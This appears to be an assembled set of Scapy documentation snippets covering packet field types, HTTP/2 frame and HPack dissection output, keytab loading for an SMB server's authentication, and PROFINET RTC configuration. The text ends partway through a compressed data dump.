https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_15\n\nLANGUAGE: python\nCODE:\n```\nByteField           \nXByteField    \n\nShortField\nSignedShortField\nLEShortField\nXShortField\n\nX3BytesField        # three bytes as hex\nXLE3BytesField      # little endian three bytes as hex\nThreeBytesField     # three bytes as decimal\nLEThreeBytesField   # little endian three bytes as decimal\nLE3BytesEnumField\nXLE3BytesEnumField\n\nIntField\nSignedIntField\nLEIntField\nLESignedIntField\nXIntField\n\nLongField\nSignedLongField\nLELongField\nLESignedLongField\nXLongField\nLELongField\n\nIEEEFloatField\nIEEEDoubleField \nBCDFloatField       # binary coded decimal\n\nBitField\nXBitField\n\nBitFieldLenField    # BitField specifying a length (used in RTP)\nFlagsField          \nFloatField\n```\n\n----------------------------------------\n\nTITLE: HTTP/2 Frame Structure with HPack Headers in Scapy\nDESCRIPTION: Shows the structure of an HTTP/2 frame containing HPack compressed headers and a padded data frame. Includes header string compression, literal headers with incremental indexing, and indexed header fields.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_26\n\nLANGUAGE: python\nCODE:\n```\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 9\n   |      |   |  data      = 'HPackZString(SAMEORIGIN)'\n   |      |###[ HPack Literal Header With Incremental Indexing ]### \n   |      |  magic     = 1\n   |      |  index     = 55\n   |      |  \\hdr_value \\\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 165\n   |      |   |  data      = 'HPackZString(NID=91=Wt1Jkm3Eretgg-hJ32fkj7kSSOLTc8tfEEIP5F2QTzHqbsXcCFve-QoN1oZvkGEqqqAWklc2wlj97YDkMnGXQUw20iCYMc3FD6X-KVuK1wdFURafcqQMQZ8e-F14YUfn; expires=Wed, 14-Jun-2017 17:34:51 GMT; path=/; domain=.google.fr; HttpOnly)'\n   |      |###[ HPack Indexed Header Field ]### \n   |      |  magic     = 1\n   |      |  index     = 71\n   |###[ HTTP/2 Frame ]### \n   |  len       = 0x122b\n   |  type      = DataFrm\n   |  flags     = set(['End Stream (ES)', 'Padded (P)'])\n   |  reserved  = 0L\n   |  stream_id = 1L\n   |###[ HTTP/2 Padded Data Frame ]### \n   |     padlen    = 230\n   |     data      = '\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\\x02\\xff\\xc5:\\xebz\\xdb\\xb6\\x92\\xff\\xfb\\x144\\xfcU\\x96\\xd6\\xb4DR7R4\\x9d\\x93:n\\xe2n\\xda\\xa4\\'\\xc9I\\xcf\\xa6\\xa9>\\x90\\x84(\\xc6\\xbc\\x99\\x00e;\\xb2\\xdem\\x1fg\\xf3\\x16;\\x03^D\\xc9N\\xd2o\\xff\\xec\\x97DC\\x003\\x03\\xcc\\x053\\x03 \\xa7\\x07~\\xea\\x89\\xbb\\x8c)K\\x11Gg\\xa7\\xf8\\xab\\x84\\x82\\xc5\\xdcK3\\xe6\\x10\"\\x1b\\x88\\xe0\\x90\\xa5\\x10\\xd9l0\\xe0\\xde\\x92\\xc5\\xb4\\x9f\\xe6\\xc1\\xe0=s_\\xd3\\x80\\x11%\\xa2I\\xe0\\x90EN\\x80\\x03\\xa3\\xfe\\xd9i\\xcc\\x04U\\xbc4\\x11,\\x11\\x0e\\x11\\xecV\\x0c\\x90\\xb5\\xadxK\\x9as&\\x9cwo\\x7f>1\\x89\\x82<O\\xd8u\\x11\\xae\\x1cr^\\xa2\\x9f\\xbc\\x85\\xd9\\xc8>\\x8bA\\x18\\xc3L|\\xe0\\xe64\\xf1\\xc3$\\x18\\x04i\\x1aD,\\x18\\xe8\\xb7\\xf5\\xe7\\x9c\\x0b\\x18\\xa3\\xb9?\\xf7\\xd2(\\xcd\\xe7\\xbaa\\xfaY?K\\x82R\\x88,O3\\x87H6\\xc0]\\x84\"bg\\xcf%\\xe5\\xe9\\xa0l\\x9dr/\\x0f3q\\xd6]\\x14\\x89\\'\\xc24\\xe9\\xf6\\xd67a\\xe2\\xa77\\xfdr\\ng}uq9;z\\xf5\\xf9\\xe7\\xdf\\xdf\\xff2?y9z\\xf5_\\xf4ul%\"xu\\xa4^]\\xfc\\xf1\\x1a\\x06\\xa7cmj\\xe8\\xaa>\\x1c\\xeb\\x96\\x066T\\x87SM3FCu\\xa4\\x19\\x96\\xa9\\x8f\\x01\\x0e\\x8d\\xc9t\\x8a\\xd0\\xd4t\\x03\\xe0H7-\\x0b\\xe1pd\\xc9\\xf6\\xd8\\x1c\\xe9\\x08\\xcd\\xe1\\x08\\xf1\\xc6\\xe3\\xe9\\x08\\xe9&\\xc6d2A8\\x9e\\x9a\\xd8?\\x99\\x9a\\x13\\r\\xa19\\x1eKh\\x99C\\xb3\\x84\\x92~jL4C\\xc2\\xe9\\x14\\xe9\\xa7C\\xe0%\\xe1\\xd40%\\xb4\\xc68/p\\xb7\\xa6\\x12ZC9>\\xd1\\xac\\x12ZC\\xbd\\x84r}Ss$\\xf9\\x03\\x1cO$\\x9cNF\\x08-]\\x93mk4\\x92\\xf3Y\\xb0R\\tM\\xab\\x1c\\xb7\\xc6\\x08A\\xdc\\t\\xcec\\xea\\xda\\xb0\\x86\\xc8\\xd644\\xc9\\xcf4\\xf4\\xc9XBC\\x97\\xe3\\xc6D\\x97\\xe3\\xa0\\x069>\\x02\\rJ8\\x94\\xfa4a\\xbd\\xb2\\x7f\\xac\\x8d%\\xfexbH8\\xd1t]B\\xc3\\xd2$4\\'\\x12\\x7f:\\xd5%\\xfd\\xd4\\x92\\xfa7\\x91a\\t\\x87\\x93\\x12\\x8e\\xe4\\xb89)\\xf9[\\x9aV\\xc2R>\\xd3\\x1a\\x96\\xeb\\xb6\\x86\\xa3\\xb2=2\\xe5<\\xd6X\\xea\\xc5\\xb4&V\\xd9?\\x1d\\xe9\\x15D\\xfe\\xc0\\xc6\\x9cH8\\x1c\\x1b\\x12\\x8e4\\xbd\\x84\\xd2\\xae\\x16hf\\xa2\\x9aCM\\xd3\\xac\\x12\\x1aSC\\xc2\\xd1\\xd4TA\\xba\\xc9\\x04\\xfc\\x06\\xe0t\\x08\\xf3!\\x1c\\x81^\\x10\\x9ac\\xb3\\x84\\x96l\\x9b\\xda\\xb8\\x82\\x13\\x89o\\x8eA~\\x84\\x16\\xe8\\x07\\xa0\\x05\\x9c$D\\x7f\\xd45\\x03&4\\x87\\xe8\\xa8\\xf0a\\x18G*-\\xc4\\xb2\\xe0,\\x9fi\\xea\\x15\\xf7\\xf8\\xec\\xc8\\xb3<K7\\x17\\xda\\xdc\\x18\\x1dm\\xecr\\x0b\\xf4\\xaf^\\xbct\\x8e\\x16\\xf9\\x91\\xbd\\xe9u{v{\\xabT\\x08\\x91\\xe7|\\xf8XcG\\xa1\\xa3\\xd5\\xdf\\x01\\x13\\x17\\x97NC@{\\xebE\\x9awW4W\\\\\\x9bv:\\xdd\\x03\\x8a(O\\x85\\xc8C\\xb7\\x10\\xec\\xfe\\xfe\\xa0\\xeb:\\xbb}]\\xc2B\\x9f\\xf4z=\\xbbGa(\\xa39\\x04\\x87\\xdfR\\x9f\\xd99\\x13E\\x9e(\\xee\\xfd}\\xbd\\xce\\x8b\\xcbMk\\xe6\\x97_\\x9b\\xdaI\\x8a(\\xfa\\xfb\\xf3G\\xdf[@3)\\x866\\xee\\xb4\\xf4Sb\\xc80\\xcag\\xc4q\\xaa\\xd0\\x12\\xa5\\x1eE\\x8c>\\x04(\\x91B\\xe8j8\\xc4\\xd1Cr\\x05\\x97\\xdb`\\xdc\\xb40\\xa8\\xea\\xf6\\xd6\"\\xbf[7\\xd4\\xdd\\x8b<\\x071iO=\\xd0ap\\x03\\xf3x\\xcb\\xae\\xd7[o\\x1a\\x06\"\\x8c\\xd9\\xc3I\\xba\\t\\xbbQ\\x9eQ\\xc1z(\\xfd[\\xc0\\xe9\\xf6\\x1a\\x92(\\rv&U=\\xd5W\\x83\\xde\\x9a:[\\x84wy\\xd4\\x1a\\xb2\\xc3E\\x97\\x90\\x03\\x07\\xd4\\x0e\\xea\\x06\\xd6\\x97\\x18\\x84mT?k\\x88<u\\xd1|\\x876\\xfb\\xb0\\xf8\\xe8\\xb8\\xb6\\xdbO\\x13\\x86B8\\xf8\\x15\\xa5\\xd4\\x97\\x1f\\xd4Ms\\xd1^\\xb6\\xcf\"&\\x98\\x82T\\x1b{\\'dw:;\\xcd\\xfe\\x8aE\\x8ft\\xf5\\xa3\\xe2\\xf1^P\\x1e,\\x82\\xe7\\x9eC[.\\xbd8\\xd67m}\\x80\\xb8\\x8f\\xaa\\xa4\\x94\\x90\\x90\\x96h\\xfc\\xfe\\x9e\\x10\\xdb\\xbb\\xbf?\\xd1\\x0f@\\x16\\xceh\\x0e6!\\x1d\\x16:\\xa4w\\x7f\\xdf\\x05t\\xf9}\\xdc\\xde4]\\xbf\\xa7\\x9e\\xe8N\\x1b?\\x92\\x04\\xe0\\xb5\\xbe\\xb3\\xe3\\xe4\\x80\\x8a\\xbd\\xec\\xd8\\xa9p\\x8e\\xa1\\xc3\\xa6\\x0e\\xccH\\x06\\xe4\\xb8\\x1b\\x00\\x0cX27\\xb4\\x11\\xe9\\x1d\\x93\\'\\x14r\\xbb\\x13v<H\\xb1\\xc7\\xf4\\x98t<P19v\\x8f\\xd9\\xf1\\x02Z\\x9f\\x97\\xb7+\\x11\\xd2\\r\\xec\\xc1_e\\x1d\\x10\\xf6\\x05\\xe3\\x02\\xf4\\xd3\\xe9\\xb4\\x1d\\xbe\\x8b\\xb3\\xef{ \\xa1D\\xfa\\xe0\\x1a\\x149\\xa3j\\x10\\xc5\\xf1L\\xdf\\xf4T\\n\\xba\\xe9\\xd5;\\x876\\x1a\\xbds\\xd6\\xcd\\xf7\\xed\\x9e\\x83\\xd7(\\x1fh?\\xf4?:\\x1f\\xa0\\xf3c\\xc5\\xe1@\\xdf\\xda\\xe4\\xba\\x1d\\x83\\xd0mv\\xcd\\xb3\\rV\\xd7\\xfd\\xac\\xe0\\xcb\\xee\\x87\\x0f\\xf4#\\x0e|l\\xfb9\\xf5\\x9fF\\xfb\\x1bl\\x9f\\x0e\\xe7\\x07\\x9aM\\xaf\\xef\\xd1(\\xea\\x8ae\\xc8{\\xd2\\xb3\\xe9\\xfe\\xfeV1\\x98,s\\xb6\\xe8C?\\xbb}\\x05{\\xe2\\x90\\xc8\\xbd\\xa1\\x9d:n\\xe9,^\\x8d\\xc2\\x0b\\x97C\\xccI\\x82\\xae{\\xac\\x83\\xd2\\xbb\\x7f\\xddwz\\xd7\\xce\\xa0T\\xba\\x07JF\\x7f\\xf0vXu:\\xb4\\x9f\\xb3,\\xa2\\x1e\\xc4\\xa9A\\xe9)O\\xc8\\xb1\\xd7t\\x96\\\\\\x16\\x99\\xf3\\xe1\\xaf\\xce\\xc7\\xff\\x18\\x04*A\\x17\\x90&_\\x12\\x10\\xe2tP\\x15@\\xa7\\\\\\xdcA=t\\x18\\xb84W\\x0f\\x03L\\n\\x100\\xa14\\xe3\\xe1g6\\xd3\\x87\\xd9\\xad\\x9dQ\\x1f\\xcb\\xb0\\x13\\x91f3=\\xbbU\\x0e\\xc28\\x83MI\\x13ao$\\xddz\\xc9\\xc2`)f\\x86\\x91\\xddn*\\x1e5\\x91\\x9b\\n\\x91\\xc6\\xb3\\xe9.\\x1dV\\x89\\'4\\n\\x83d\\x96#\\xe9\\xa6\\x1f\\xb8K\\x15~\\xfc5\\xecw\\x9f\\xe5\\xcdd<\\x8dB_9\\xf4,\\x7f\\xba\\xd0\\xed\\xd6\\xca`*$\\xaa\\xe7\\xd6\\xec,\\xe5!*\\x7fF] \\x82\\x08n#\\x0fc\\x04\\x12\\xdc\\x84\\xbeX\\xcetM\\xfbq\\xf3\\x8f\\x98\\xf9!U\\xc0\\x80k \\xd7\\xdbK\\xb7c\\x9a\\x07ar\"W4\\xeb\\x8fYl\\xafX.B\\xb0v\\xb5V`XI\\xbc\\x00\\x97\\x11\\xb3\\x88-\\xc4fC\\x91\\x91\\x8a\\xbf\\xa3\\xb5\\x14\\xccg^\\x9aKG\\x98\\x15`\\xb4<\\n\\x13\\xd6\\x92~\\x87@\\xd6\\xaf\\xb3CM\\xf3\\xda\\x180\\x14*\\xedq\\xdf7\\x991\\xddCY\\xec\\xa0@\\xf1\\xd1\\x1e\\xff\\x01L,M[Y\\xd8M\\xfd;U\\xf8*U3\\xb5\\xbf,m\\xbc\\xa0q\\x18\\xdd\\xcdh\\x1e\\xd2H\\xe54\\xe1\\'`\\xbap\\xb1A\\xdcu\\xa9\\rPl\\nZ\\x00yoN\\xeef\\xe04)\\xe4\\xa4\\xc3 \\rj\\x0b\\xcf\\xc0E\\x14\\x13\\xfei\\x1b\\xe1\\xafQ\\xd4\\x93J\\xa7}\\x93\\xc5\\xb0L\\xea\\xcdceoH\\x07\\x7f\\xd8@^\\x8e\\xabYj7144\\xeb\\xb2\\x16i8\\xf16\\xfd\\xeb\\x96\\x8e6}\\xc1\\x91W=\\xb7\\x86\\x1d\\xb5\\xcb\\x00ZD3\\xcef\\xf5\\xc7\\x86\\xc5\\xa5\\x9c7\\xe5\\xacn\\x1a\\xf9\\x95\\x0b\\xa1Jf\\t,\\x80F\\x1b\\x88\\xd4\\xa2\\xf1\\x83q\\xe3.#k\"}\\x8c/BU\\xa2 \\xe5LGQ\\x1f(\\x0c\\xb1x\\x850}\\x14\\xc1\\xe7k?\\xe4\\xb09\\xeffa\"U\\xe1\\xa6\\xb7\\xf6~\\x17\\x04\\x90\\xab\\xca\\r\\xa5^5e\\xb4\\xf5K\\xf4\\xb6\\x19\\xb47a\\x92\\x15b\\xc7\\x82a\\xb2\\x84i\\xda\\x9ee\\xc8\\xdf\\xe1\\xae\\x97\\xe9\\xfa\\x8e\\x97I3\\xbb\\xd4\\xbb\\n\\xf2\\x14\\x1cuv\\xb8X,\\xec\\x12\\xd5\\x85(r\\xb5\\xa1-B{\\xdf\\xb5\\x13\\xc8\\xd7\\x1b:[\\xa2{\\xa8tF!r\\xae\\xd8\\xd77\\xc0\\xa6\\xbf\\x88\\x14\\xda\\xb6,\\x9d\\xadB\\xd8\\xb2\\xcc\\xaf;\\xc7c\\x9d\\x9a\\xee\\xdf\\xdbO\\x12kX\\xce\\xfe\\x00K.\\xed0\\xc0\\xf3\\xa9\"\\x95Q\\xe1U\\xf3\\x80\\x98;;\\x89\\xbb\\x91\\xb7nG\\xb91\\x1a\\x1e{a\\xc1\\xb5\\x89vlc\\xa0mv\\xec\"#e+<\\xc9\\xf8\\x14q\\xd7\\xddQ0c\\xcc.\\xbduV\\x066@\\xb3\\xb7\\xee\\x8b\\x8b\\xf3<O9\\x84cX\\xf5\\x03M\\xbb\\xf2\\xcd\\xa1\\xd6\\xf0\\xdcY\\x14hVD\\xea\\xe1\"\\x8aZ\\xcb}\\xcc\\xa34E7*\\x16\\xedU\\x15P\\xc1\\xd5g\\xee\\x84\\xae\\xe6P\\xe5\\xa4\\x86a\\xe1q\\xba\\x07\\x1ex\\x02\\x873\\x10\\x172\\x0b\\xa3\\xe2\\xa4^\\xae\\xd4\\xb1\\xdd\\xecL\\xcd\\xf6\\x8a\\x9c\\xc3w\\x96\\x86p\\x8c\\xcf\\xdbk\\xb6\\xb7\\x91\\xa4\\x10\\xb8*\\xf8*\\xb7\\xca\\xf8\\x91\\xad\\xf2X\\xcc\\xc5\\x15\\xd7\\x0e\\xd6V\\'(G\\xee\\xde\\xd9\"\\xf5\\n\\xbe\\xae\\xd9K\\xf3o\\xc3_\\x95\\xe8\\x9a\\x8c\\x078W\\n\\xa6\\xdeG\\xae\\x1a\\xa00\\xf7\\x0bO\\x0cB/m\\xee\\x1a\\xa2\\xd4\\xcf\\xfa\\xd0A@\\x07\\x91C\\xf8\\x12\\xfc\\xc6+\\x84\\x02]\\t\\x01\\xbe\\xe55\\x08n&\\xc5\\r\\xa4F\\x1c\\x82>F\\x1e\\xbde\\xc0\\xdc\\x8fE\\xe6\\xd1WT~$K\\x8a\\x90q(\\xbdi\\xc4\\x99\\xed\\x83l1\\x1c=\\xfa8CU\\x1a+\\x8e\\xf2\\xf0\\xe2\"Q:\\x1d\\xa5\\xfe\\xeeb\\xb9\\xa1t\\x1b\\xe2r\\xb2\\xde\\xba\\xa9\\xc9\\xbb=Y\\xeb\\xc2?{\\xf3\\x03\\xa2\\x1e\\xe0\\x9cP_\\xd7\\x14\\x8bNg\\xfb\\xdd\\xbf\\xeeK\\x1d\\x03\\xdb\\xa63p\\xaf\\xdb8\\xd8l\\xa1m~\\x80?xn\\xdc*\\xde\\x0f'\n```\n\n----------------------------------------\n\nTITLE: Loading and Using Keytab for Server Authentication in Scapy\nDESCRIPTION: This snippet shows how to load a keytab file for server authentication and use it to create a Security Support Provider (SSP) for an SMB server. It opens a keytab file and sets up the SSP using a specific service principal name.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\n>>> t.open_keytab(\"server1.keytab\")\n>>> t.show()\nKeytab name: server1.keytab\nPrincipal                             Timestamp          KVNO  Keytype\nhost/Server1.domain.local@DOMAIN.LOCAL  01/01/70 01:00:00  10    RC4-HMAC\n\nNo tickets in CCache.\n>>> ssp = t.ssp(\"host/Server11.domain.local@DOMAIN.LOCAL\")\n>>> # Example: start a SMB server\n>>> smbserver(ssp=ssp)\n```\n\n----------------------------------------\n\nTITLE: Configuring Scapy for PROFINET RTC Packet Dissection in Python\nDESCRIPTION: This snippet demonstrates how to configure Scapy to correctly dissect PROFINET RTC packets. It updates the conf.contribs[\"PNIO_RTC\"] dictionary with the necessary configuration for packet dissection.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/pnio.rst#2025-04-23_snippet_2\n\nLANGUAGE: Python\nCODE:\n```\n>>> e=Ether(src='00:01:02:03:04:05', dst='06:07:08:09:0a:0b') / ProfinetIO(frameID=\"RT_CLASS_1\") / p\n>>> e.show2()\n>>> conf.contribs[\"PNIO_RTC\"].update({('00:01:02:03:04:05', '06:07:08:09:0a:0b', 0x8000): [\n... PNIORealTime_IOxS,\n... PNIORealTimeCyclicPDU.build_fixed_len_raw_type(4),\n... PNIORealTime_IOxS,\n... PROFIsafe.build_PROFIsafe_class(PROFIsafeControl, 4),\n... PNIORealTime_IOxS,\n... ]})\n>>> e.show2()\n```\n\n----------------------------------------\n\nTITLE: Parsing HTTP/2 Data Frame with Scapy\nDESCRIPTION: This snippet demonstrates how Scapy parses an HTTP/2 data frame, including its length, type, flags, and stream ID. It also shows the structure of a padded data frame with its padding length and compressed data.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_20\n\nLANGUAGE: python\nCODE:\n```\n###[ HTTP/2 Frame ]### \n  len       = 0x122b\n  type      = DataFrm\n  flags     = set(['End Stream (ES)', 'Padded (P)'])\n  reserved  = 0L\n  stream_id = 1L\n###[ HTTP/2 Padded Data Frame ]### \n     padlen    = 230\n     data      = '\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\\x02\\xff\\xc5:\\xebz\\xdb\\xb6\\x92\\xff\\xfb\\x144\\xfcU\\x96\\xd6\\xb4DR7R4\\x9d\\x93:n\\xe2n\\xda\\xa4\\'\\xc9I\\xcf\\xa6\\xa9>\\x90\\x84(\\xc6\\xbc\\x99\\x00e;\\xb2\\xdem\\x1fg\\xf3\\x16;\\x03^D\\xc9N\\xd2o\\xff\\xec\\x97DC\\x003\\x03\\xcc\\x053\\x03 \\xa7\\x07~\\xea\\x89\\xbb\\x8c)K\\x11Gg\\xa7\\xf8\\xab\\x84\\x82\\xc5\\xdcK3\\xe6\\x10\"\\x1b\\x88\\xe0\\x90\\xa5\\x10\\xd9l0\\xe0\\xde\\x92\\xc5\\xb4\\x9f\\xe6\\xc1\\xe0=s_\\xd3\\x80\\x11%\\xa2I\\xe0\\x90EN\\x80\\x03\\xa3\\xfe\\xd9i\\xcc\\x04U\\xbc4\\x11,\\x11\\x0e\\x11\\xecV\\x0c\\x90\\xb5\\xadxK\\x9as&\\x9cwo\\x7f>1\\x89\\x82<O\\xd8u\\x11\\xae\\x1cr^\\xa2\\x9f\\xbc\\x85\\xd9\\xc8>\\x8bA\\x18\\xc3L|\\xe0\\xe64\\xf1\\xc3$\\x18\\x04i\\x1aD,\\x18\\xe8\\xb7\\xf5\\xe7\\x9c\\x0b\\x18\\xa3\\xb9?\\xf7\\xd2(\\xcd\\xe7\\xbaa\\xfaY?K\\x82R\\x88,O3\\x87H6\\xc0]\\x84\"bg\\xcf%\\xe5\\xe9\\xa0l\\x9dr/\\x0f3q\\xd6]\\x14\\x89\\'\\xc24\\xe9\\xf6\\xd67a\\xe2\\xa77\\xfdr\\ng}uq9;z\\xf5\\xf9\\xe7\\xdf\\xdf\\xff2?y9z\\xf5_\\xf4ul%\"xu\\xa4^]\\xfc\\xf1\\x1a\\x06\\xa7cmj\\xe8\\xaa>\\x1c\\xeb\\x966T\\x87SM3FCu\\xa4\\x19\\x96\\xa9\\x8f\\x01\\x0e\\x8d\\xc9t\\x8a\\xd0\\xd4t\\x03\\xe0H7-\\x0b\\xe1pd\\xc9\\xf6\\xd8\\x1c\\xe9\\x08\\xcd\\xe1\\x08\\xf1\\xc6\\xe3\\xe9\\x08\\xe9&\\xc6d2A8\\x9e\\x9a\\xd8?\\x99\\x9a\\x13\\r\\xa19\\x1eKh\\x99C\\xb3\\x84\\x92~jL4C\\xc2\\xe9\\x14\\xe9\\xa7C\\xe0%\\xe1\\xd40%\\xb4\\xc68/p\\xb7\\xa6\\x12ZcP\\x0cL\\'\\x12N'\\x23\\x84\\x96\\xaem\\xdb\\x1a\\x8d\\xe4|\\x16\\xacT\\xc2\\xd2*\\xc7\\xadq\\xcbq\\x0b\\x9c\\xc7\\xd4\\xb5a\\r\\x91\\xd9\\xd0\\xf4\\xca\\xf9L\\x1fO,i\\x7f\\xac\\x8d%\\xfexbH8\\xd1t]B\\xc3\\xd2$4\\'\\x12\\x7f:\\xd5%\\xfd\\xd4\\x92\\xfa7\\x91a\\t\\x87\\x93\\x12\\x8e\\xe4\\xb89)\\xf9[\\x9aV\\xc2R>\\xd3\\x1a\\x96\\xeb\\xb6\\x86\\xa3\\xb2=2\\xe5<\\xd6X\\xea\\xc5\\xb4&V\\xd9?\\x1d\\xe9\\x15D\\xfe\\xc0\\xc6\\x9cH8\\x1c\\x1b\\x12\\x8e4\\xbd\\x84\\xd2\\xae\\x16hf\\xa2\\x9aCM\\xd3\\xac\\x12\\x1aSC\\xc2\\xd1\\xd4TA\\xba\\xc9\\x04\\xfc\\x06\\xe0t\\x08\\xf3!\\x1c\\x81^\\x10\\x9ac\\xb3\\x84\\x96l\\x9b\\xda\\xb8\\x82\\x13\\x89o\\x8eA~\\x84\\x16\\xe8\\x07\\xa0\\x05\\x9c$D\\x7f\\xd45\\x03&4\\x87\\xe8\\xa8\\xf0a\\x18G*-\\xc4\\xb2\\xe0,\\x9fi\\xea\\x15\\xf7\\xf8\\xec\\xc8\\xb3<K7\\x17\\xda\\xdc\\x18\\x1dm\\xecr\\x0b\\xf4\\xaf^\\xbct\\x8e\\x16\\xf9\\x91\\xbd\\xe9u{v{\\xabT\\x08\\x91\\xe7|\\xf8XcG\\xa1\\xa3\\xd5\\xdf\\x01\\x13\\x17\\x97NC@{\\xebE\\x9awW4W\\\\\\x9bv:\\xdd\\x03\\x8a(O\\x85\\xc8C\\xb7\\x10\\xec\\xfe\\xfe\\xa0\\xeb:\\xbb}]\\xc2B\\x9f\\xf4z=\\xbbGa(\\xa39\\x04\\x87\\xdfR\\x9f\\xd99\\x13E\\x9e(\\xee\\xfd}\\xbd\\xce\\x8b\\xcbMk\\xe6\\x97_\\x9b\\xdaI\\x8a(\\xfa\\xfb\\xf3G\\xdf[@3)\\x866\\xee\\xb4\\xf4Sb\\xc80\\xcag\\xc4q\\xaa\\xd0\\x12\\xa5\\x1eE\\x8c>\\x04(\\x91B\\xe8j8\\xc4\\xd1Cr\\x05\\x97\\xdb`\\xdc\\xb40\\xa8\\xea\\xf6\\xd6\"\\xbf[7\\xd4\\xdd\\x8b<\\x071iO=\\xd0ap\\x03\\xf3x\\xcb\\xae\\xd7[o\\x1a\\x06\"\\x8c\\xd9\\xc3I\\xba\\t\\xbbQ\\x9eQ\\xc1z(\\xfd[\\xc0\\xe9\\xf6\\x1a\\x92(\\rv&U=\\xd5W\\x83\\xde\\x9a:[\\x84wy\\xd4\\x1a\\xb2\\xc3E\\x97\\x90\\x03\\x07\\xd4\\x0e\\xea\\x06\\xd6\\x97\\x18\\x84mT?k\\x88<u\\xd1|\\x876\\xfb\\xb0\\xf8\\xe8\\xb8\\xb6\\xdbO\\x13\\x86B8\\xf8\\x15\\xa5\\xd4\\x97\\x1f\\xd4Ms\\xd1^\\xb6\\xcf\"&\\x98\\x82T\\x1b{\\'dw:;\\xcd\\xfe\\x8aE\\x8ft\\xf5\\xa3\\xe2\\xf1^P\\x1e,\\x82\\xe7\\x9eC[.\\xbd8\\xd67m}\\x80\\xb8\\x8f\\xaa\\xa4\\x94\\x90\\x90\\x96h\\xfc\\xfe\\x9e\\x10\\xdb\\xbb\\xbf?\\xd1\\x0f@\\x16\\xceh\\x0e6!\\x1d\\x16:\\xa4w\\x7f\\xdf\\x05t\\xf9}\\xdc\\xde4]\\xbf\\xa7\\x9e\\xe8N\\x1b?\\x92\\x04\\xe0\\xb5\\xbe\\xb3\\xe3\\xe4\\x80\\x8a\\xbd\\xec\\xd8\\xa9p\\x8e\\xa1\\xc3\\xa6\\x0e\\xccH\\x06\\xe4\\xb8\\x1b\\x00\\x0cX27\\xb4\\x11\\xe9\\x1d\\x93\\'\\x14r\\xbb\\x13v<H\\xb1\\xc7\\xf4\\x98t<P19v\\x8f\\xd9\\xf1\\x02Z\\x9fo\\xb7+\\x11\\xd2\\r\\xec\\xc1_e\\x1d\\x10\\xf6\\x05\\xe3\\x02\\xf4\\xd3\\xe9\\xb4\\x1d\\xbe\\x8b\\xb3\\xef{ \\xa1D\\xfa\\xe0\\x1a\\x149\\xa3j\\x10\\xc5\\xf1L\\xdf\\xf4T\\n\\xba\\xe9\\xd5;\\x876\\x1a\\xbds\\xd6\\xcd\\xf7\\xed\\x9e\\x83\\xd7(\\x1fh?\\xf4?:\\x1f\\xa0\\xf3c\\xc5\\xe1@\\xdf\\xda\\xe4\\xba\\x1d\\x83\\xd0mv\\xcd\\xb3\\rV\\xd7\\xfd\\xac\\xe0\\xcb\\xee\\x87\\x0f\\xf4#\\x0e|l\\xfb9\\xf5\\x9fF\\xfb\\x1bl\\x9f\\x0e\\xe7\\x07\\x9aM\\xaf\\xef\\xd1(\\xea\\x8ae\\xc8{\\xd2\\xb3\\xe9\\xfe\\xfeV1\\x98,s\\xb6\\xe8C?\\xbb}\\x05{\\xe2\\x90\\xc8\\xbd\\xa1\\x9d:n\\xe9,^\\x8d\\xc2\\x0b\\x97C\\xccI\\x82\\xae{\\xac\\x83\\xd2\\xbb\\x7f\\xddwz\\xd7\\xce\\xa0T\\xba\\x07JF\\x7f\\xf0vXu:\\xb4\\x9f\\xb3,\\xa2\\x1e\\xc4\\xa9A\\xe9)O\\xc8\\xb1\\xd7t\\x96\\\\\\x16\\x99\\xf3\\xe1\\xaf\\xce\\xc7\\xff\\x18\\x04*A\\x17\\x90&_\\x12\\x10\\xe2tP\\x15@\\xa7\\\\\\xdcA=t\\x18\\xb84W\\x0f\\x03L\\n\\x100\\xa14\\xe3\\xe1g6\\xd3\\x87\\xd9\\xad\\x9dQ\\x1f\\xcb\\xb0\\x13\\x91f3=\\xbbU\\x0e\\xc28\\x83MI\\x13ao$\\xddz\\xc9\\xc2`)f\\x86\\x91\\xddn*\\x1e5\\x91\\x9b\\n\\x91\\xc6\\xb3\\xe9.\\x1dV\\x89\\'4\\n\\x83d\\x96#\\xe9\\xa6\\x1f\\xb8K\\x15~\\xfc5\\xecw\\x9f\\xe5\\xcdd<\\x8dB_9\\xf4,\\x7f\\xba\\xd0\\xed\\xd6\\xca`*$\\xaa\\xe7\\xd6\\xec,\\xe5!*\\x7fF] \\x82\\x08n#\\x0fc\\x04\\x12\\xdc\\x84\\xbeX\\xcetM\\xfbq\\xf3\\x8f\\x98\\xf9!U\\xc0\\x80k \\xd7\\xdbK\\xb7c\\x9a\\x07ar\"W4\\xeb\\x8fYl\\xafX.B\\xb0v\\xb5V`XI\\xbc\\x00\\x97\\x11\\xb3\\x88-\\xc4fC\\x91\\x91\\x8a\\xbf\\xa3\\xb5\\x14\\xccg^\\x9aKG\\x98\\x15`\\xb4<\\n\\x13\\xd6\\x92~\\x87@\\xd6\\xaf\\xb3CM\\xf3\\xda\\x180\\x14*\\xedq\\xdf7\\x991\\xddCY\\xec\\xa0@\\xf1\\xd1\\x1e\\xff\\x01L,M[Y\\xd8M\\xfd;U\\xf8*U3\\xb5\\xbf,m\\xbc\\xa0q\\x18\\xdd\\xcdh\\x1e\\xd2H\\xe54\\xe1\\'`\\xbap\\xb1A\\xdcu\\xa9\\rPl\\nZ\\x00yoN\\xeef\\xe04)\\xe4\\xa4\\xc3 